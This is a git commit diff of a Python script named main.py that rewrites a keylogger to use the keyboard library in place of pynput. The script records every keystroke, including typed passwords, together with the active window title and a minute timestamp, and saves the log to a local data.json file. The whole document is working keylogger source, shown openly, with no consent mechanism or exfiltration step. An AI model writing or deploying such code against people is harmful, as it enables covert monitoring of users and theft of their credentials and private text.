6bfa879107f957e152d286f69a03ce29b055965d
Haim Assraf <haimassraf@gmail.com>
2025-02-13 16:45:38 +0200

    replace the import

--- main.py
+++ main.py
@@ -1,50 +1,57 @@
 from datetime import datetime
-from pynput.keyboard import Listener
+import keyboard
 import pygetwindow as gw
 import json
+
 
 class KeyLoggerService:
     def __init__(self):
         self.dict = {}
 
-    def on_press(self, key):
-        if self._get_window() not in self.dict:
-            self.dict[self._get_window()] = {self._get_time(): self._add_char(key)}
-        else:
-            if self._get_time() not in self.dict[self._get_window()]:
-                self.dict[self._get_window()][self._get_time()] = self._add_char(key)
+    def on_press(self, event):
+        window = self._get_window()
+        time = self._get_time()
+
+        if len(event.name) > 1:
+            if event.name == "space":
+                key = " "
+            elif event.name == "enter":
+                key = "\n"
             else:
-                self.dict[self._get_window()][self._get_time()] += self._add_char(key)
+                key = f" [{event.name}] "
+        else:
+            key = event.name
+
+        if window not in self.dict:
+            self.dict[window] = {time: key}
+        else:
+            if time not in self.dict[window]:
+                self.dict[window][time] = key
+            else:
+                self.dict[window][time] += key
 
         FileWriter.write_to_file(self.dict)
-        # print(self.dict)
-
-    def _add_char(self, key):
-        if hasattr(key, 'char'):
-            return key.char
-        elif str(key) == "Key.space":
-            return " "
-        else:
-            return f" [{key}] "
 
     def _get_window(self):
-        return gw.getActiveWindow().title
+        window = gw.getActiveWindow()
+        return window.title if window else "Unknown Window"
 
     def _get_time(self):
         return datetime.now().strftime("%d/%m/%y %H:%M")
+
 
 class FileWriter:
     def __init__(self, file_path='./data.json'):
         self.file_path = file_path
 
     def write_to_file(self, data_json):
-        with open(self.file_path, 'w') as my_data_json:
-            json.dump(data_json, my_data_json, indent=4)
+        with open(self.file_path, 'w', encoding="utf-8") as my_data_json:
+            json.dump(data_json, my_data_json, indent=4, ensure_ascii=False)
 
 
 FileWriter = FileWriter()
 KeyLoggerService = KeyLoggerService()
-with Listener(on_press=KeyLoggerService.on_press) as listener:
-    listener.join()
 
-# know im in haims branch
+keyboard.on_press(KeyLoggerService.on_press)
+keyboard.wait()
+
